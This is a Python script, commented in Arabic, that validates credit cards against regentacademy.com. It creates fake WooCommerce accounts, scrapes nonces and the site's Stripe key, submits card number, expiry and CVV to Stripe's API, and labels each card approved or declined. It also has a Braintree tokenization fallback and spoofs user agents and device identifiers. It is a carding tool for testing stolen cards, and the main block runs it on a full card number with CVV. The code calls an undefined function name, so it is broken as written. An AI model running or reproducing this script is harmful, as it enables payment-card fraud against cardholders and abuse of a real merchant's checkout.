import requests
import re
import random
import string
import uuid
import time
from user_agent import generate_user_agent

def Stripe1(card_data):
    """
    فحص بطاقة على regentacademy.com (Stripe Auth)
    card_data: رقم|شهر|سنة|cvv
    """
    try:
        # ===== تجزئة البطاقة =====
        card_data = card_data.strip()
        n = card_data.split("|")[0]
        mm = card_data.split("|")[1]
        yy = card_data.split("|")[2]
        cvc = card_data.split("|")[3].strip()

        if "20" in yy:
            yy = yy.split("20")[1]
        if len(yy) == 2:
            yy_full = f"20{yy}"
        else:
            yy_full = yy

        n = n.replace(" ", "")

        user = generate_user_agent()
        r = requests.Session()
        site_url = "https://regentacademy.com"

        # ===== 1. فتح صفحة الحساب =====
        print("\n[1/6] فتح صفحة الحساب...")
        headers = {
            'authority': 'regentacademy.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': user,
        }
        response = r.get(f'{site_url}/my-account/', headers=headers)
        print(f"    ✅ HTTP {response.status_code}")

        # استخراج register nonce
        reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
        if not reg_nonce:
            return "❌ Register nonce not found"
        reg_nonce = reg_nonce.group(1)
        print(f"    🔑 Register nonce: {reg_nonce}")

        # ===== 2. تسجيل حساب جديد =====
        print("\n[2/6] تسجيل حساب جديد...")
        email = f"user{random.randint(1000,9999)}{random.randint(1000,9999)}@gmail.com"
        password = f"Pass{random.randint(1000,9999)}"

        headers = {
            'authority': 'regentacademy.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site_url,
            'referer': f'{site_url}/my-account/',
            'user-agent': user,
        }

        data = {
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        response = r.post(f'{site_url}/my-account/', headers=headers, data=data)
        print(f"    ✅ تم التسجيل: {email} / {password}")

        # ===== 3. فتح صفحة إضافة البطاقة =====
        print("\n[3/6] فتح صفحة إضافة البطاقة...")
        headers = {
            'authority': 'regentacademy.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': user,
        }
        response = r.get(f'{site_url}/my-account/add-payment-method/', headers=headers)
        print(f"    ✅ HTTP {response.status_code}")

        # محاولة استخراج Stripe Key
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text)
        if not pk_live:
            pk_live = re.search(r'(pk_test_[A-Za-z0-9_-]+)', response.text)

        if pk_live:
            pk_live = pk_live.group(1)
            print(f"    🔑 Stripe key found")
        else:
            print("    ⚠️ Stripe key not found, attempting Braintree...")
            # قد يكون الموقع يستخدم Braintree
            client_nonce = re.search(r'client_token_nonce":"([^"]+)"', response.text)
            if client_nonce:
                return await_braintree_flow(r, site_url, client_nonce.group(1), n, mm, yy_full, cvc)
            return "❌ No payment gateway detected"

        # استخراج AJAX nonce
        ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
        if not ajax_nonce:
            ajax_nonce = re.search(r'name="_ajax_nonce" value="(.*?)"', response.text)
        if not ajax_nonce:
            return "❌ AJAX nonce not found"
        ajax_nonce = ajax_nonce.group(1)
        print(f"    🔑 AJAX nonce: {ajax_nonce}")

        # ===== 4. جلب معرفات Stripe =====
        print("\n[4/6] جلب معرفات Stripe...")
        headers = {
            'authority': 'm.stripe.com',
            'accept': '*/*',
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://m.stripe.network',
            'referer': 'https://m.stripe.network/',
            'user-agent': user,
        }
        response = r.post('https://m.stripe.com/6', headers=headers, data='')
        try:
            detet = response.json()
            guid = detet.get('guid', str(uuid.uuid4()))
            muid = detet.get('muid', str(uuid.uuid4()))
            sid = detet.get('sid', str(uuid.uuid4()))
            print(f"    ✅ GUID, MUID, SID obtained")
        except:
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())
            print(f"    ⚠️ تم إنشاء معرفات وهمية")

        # ===== 5. إرسال البطاقة إلى Stripe =====
        print("\n[5/6] إرسال البطاقة إلى Stripe...")
        client_session_id = str(uuid.uuid4())
        elements_session_config_id = str(uuid.uuid4())
        times = random.randint(10000, 99999)

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': user,
        }

        stripe_data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_full}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=GB&payment_user_agent=stripe.js%2Fea2f4b4e05%3B+stripe-js-v3%2Fea2f4b4e05%3B+payment-element%3B+deferred-intent&referrer={site_url}&time_on_page={times}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk_live}&_stripe_version=2025-09-30.clover'

        response = r.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, headers=headers)

        try:
            payment_id = response.json()['id']
            print(f"    ✅ Payment Method ID: {payment_id}")
        except Exception as e:
            return f"❌ فشل إنشاء وسيلة الدفع: {str(e)}"

        # ===== 6. تأكيد Setup Intent =====
        print("\n[6/6] تأكيد Setup Intent...")
        headers = {
            'authority': 'regentacademy.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': site_url,
            'referer': f'{site_url}/my-account/add-payment-method/',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }

        response = r.post(f'{site_url}/wp-admin/admin-ajax.php', data=data, headers=headers)
        text = response.text

        # ===== تحليل النتيجة =====
        print("\n" + "="*60)
        if '"success":true' in text:
            print("🎉 النتيجة: ✅ APPROVED")
            return '✅ Approved'
        elif 'card was declined' in text.lower():
            print("❌ النتيجة: ❌ DECLINED")
            return '❌ Declined'
        elif 'duplicate card exists' in text.lower():
            print("✅ النتيجة: ✅ APPROVED (DUPLICATE)")
            return '✅ Approved (Duplicate)'
        else:
            print(f"❌ النتيجة: ❌ DECLINED")
            return '❌ Declined'

    except Exception as e:
        return f'❌ خطأ في السكريبت: {str(e)}'


def await_braintree_flow(session, site_url, client_nonce, n, mm, yy, cvc):
    """معالجة حالة Braintree (إذا كان الموقع يستخدمها)"""
    print("\n🔄 معالجة Braintree flow...")
    import base64

    # الحصول على authorization fingerprint
    headers = {
        'authority': site_url.replace('https://', ''),
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': generate_user_agent(),
    }
    data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce}
    response = session.post(f'{site_url}/wp-admin/admin-ajax.php', headers=headers, data=data)

    enc = response.json().get('data')
    dec = base64.b64decode(enc).decode('utf-8')
    auth_fp = re.search(r'"authorizationFingerprint":"(.*?)"', dec).group(1)

    # Tokenize البطاقة
    headers = {
        'authority': 'payments.braintree-api.com',
        'authorization': f'Bearer {auth_fp}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'user-agent': generate_user_agent(),
    }
    json_data = {
        'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': str(uuid.uuid4())},
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
        'variables': {'input': {'creditCard': {'number': n, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvc}, 'options': {'validate': False}}},
        'operationName': 'TokenizeCreditCard',
    }
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    payment_nonce = response.json()['data']['tokenizeCreditCard']['token']

    return "✅ Braintree Payment Nonce obtained (manual check required)"


if __name__ == '__main__':
    test_card = "5294158321468738|12|2026|904"
    result = regent_academy_check(test_card)
    print(f"\n📇 Card: {test_card}")
    print(f"📊 Result: {result}")
